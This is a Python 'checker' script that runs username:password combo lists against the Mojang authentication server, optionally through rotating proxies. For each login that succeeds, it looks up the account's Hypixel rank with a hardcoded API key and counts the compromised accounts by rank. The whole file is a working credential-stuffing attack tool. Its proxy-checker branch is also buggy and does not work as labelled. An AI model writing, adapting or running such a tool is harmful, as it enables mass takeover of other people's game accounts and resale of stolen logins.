from __future__ import print_function
import requests
import json
import tkinter as tk
from tkinter import filedialog
import os


NORMALc=0
VIPc=0
VIP_PLUSc=0
MVPc=0
MVP_PLUSc=0
FAILEDc=0
UNKOWNc=0

def nopcheck(username, password):
    apikey="2ee57eea-c973-409a-93d3-9725f07ef179"
    values={
        "agent" : {
        "name" : "Minecraft", 
        "version" : 1 
        }, 
        "username" : username, 
        "password" : password,
    }
    headers={"Content-Type": "application/json"}

    r=requests.post("https://authserver.mojang.com/authenticate",json=values ,headers=headers)
    if r.status_code == 200:
        cool=json.loads(r.text)
        name=cool["availableProfiles"][0]["id"]
        r1=requests.get(f"https://api.hypixel.net/player?key={apikey}&uuid={name}",headers=headers)
        cool2=json.loads(r1.text)
        successs=cool2["success"]
        if successs == True:
            try:
                rank=cool2["player"]["newPackageRank"]
                if rank == "VIP":
                    global VIPc
                    VIPc += 1
                elif rank == "VIP_PLUS":
                    global VIP_PLUSc
                    VIP_PLUSc += 1 
                elif rank == "MVP":
                    global MVPc
                    MVPc += 1
                elif rank == "MVP_PLUS":
                    global MVP_PLUSc
                    MVP_PLUSc += 1
            except:
                global NORMALc
                NORMALc += 1
                
        else:
            global UNKOWNc
            UNKOWNc += 1


    elif r.status_code == 403:
        global FAILEDc
        FAILEDc += 1

def pcheck(username, password, ip, port):
    apikey="2ee57eea-c973-409a-93d3-9725f07ef179"
    values={
        "agent" : {
        "name" : "Minecraft", 
        "version" : 1 
        }, 
        "username" : username, 
        "password" : password,
    }
    headers={"Content-Type": "application/json"}
    proxies = {'http': f'{ip}:{port}'}

    r=requests.post("https://authserver.mojang.com/authenticate",json=values ,headers=headers, proxies=proxies)
    if r.status_code == 200:
        cool=json.loads(r.text)
        name=cool["availableProfiles"][0]["id"]
        r1=requests.get(f"https://api.hypixel.net/player?key={apikey}&uuid={name}",headers=headers, proxies=proxies)
        cool2=json.loads(r1.text)
        successs=cool2["success"]
        if successs == True:
            try:
                rank=cool2["player"]["newPackageRank"]
                if rank == "VIP":
                    global VIPc
                    VIPc += 1
                elif rank == "VIP_PLUS":
                    global VIP_PLUSc
                    VIP_PLUSc += 1 
                elif rank == "MVP":
                    global MVPc
                    MVPc += 1
                elif rank == "MVP_PLUS":
                    global MVP_PLUSc
                    MVP_PLUSc += 1
            except:
                global NORMALc
                NORMALc += 1
                
        else:
            global UNKOWNc
            UNKOWNc += 1


    elif r.status_code == 403:
        global FAILEDc
        FAILEDc += 1

def main():
    root = tk.Tk()
    root.withdraw()
    print("Guapenta Checker | guap")
    print("[1] Minercraft Checker\n[2] Proxy Checker")
    option = input("Enter Option > ")
    if option == "1":
        combos = filedialog.askopenfilename()
        prox = input("Would You like to use proxies? (y/n) | (HTTP/HTTPS)")
        if prox == "y":
            proxies = filedialog.askopenfilename()
            with open(f"{proxies}", "r") as f:
                for line in f:
                    cembo=line.strip()
                    ip=cembo.split(":",1)[0]
                    port=cembo.split(":",1)[1]
                    with open(f"{combos}", "r") as f:
                        for line in f:
                            os.system("cls")
                            cembo=line.strip()
                            user=cembo.split(":",1)[0]
                            passw=cembo.split(":",1)[1]
                            pcheck(user, passw, ip, port)
                            print("VIP:{0}\r".format(VIPc) + "\nVIP+:{0}\r".format(VIP_PLUSc)+"\nMVP:{0}\r".format(MVPc)+"\nMVP+:{0}\r".format(MVP_PLUSc)+"\nFailed:{0}\r".format(FAILEDc)+"\nUnkown:{0}\r".format(UNKOWNc),end='')
        elif prox == "n":
            with open(f"{combos}", "r") as f:
                for line in f:
                    os.system("cls")
                    cembo=line.strip()
                    user=cembo.split(":",1)[0]
                    passw=cembo.split(":",1)[1]
                    nopcheck(user,passw)
                    print("VIP:{0}\r".format(VIPc) + "\nVIP+:{0}\r".format(VIP_PLUSc)+"\nMVP:{0}\r".format(MVPc)+"\nMVP+:{0}\r".format(MVP_PLUSc)+"\nFailed:{0}\r".format(FAILEDc)+"\nUnkown:{0}\r".format(UNKOWNc),end='')
    elif option == "2":
        proxies = filedialog.askopenfile()
        with open(f"{proxies}", "r") as f:
            for line in f:
                r = requests.get("https://api.ipify.org")
                if r.status_code == 200:
                    os.system("touch C:\\Users\\Kane\\Documents\\Minecraft Checker\\active.txt")
                    with open("C:\\Users\\Kane\\Documents\\Minecraft Checker\\active.txt", "w") as f:
                        f.writelines(line + '\n')


main()
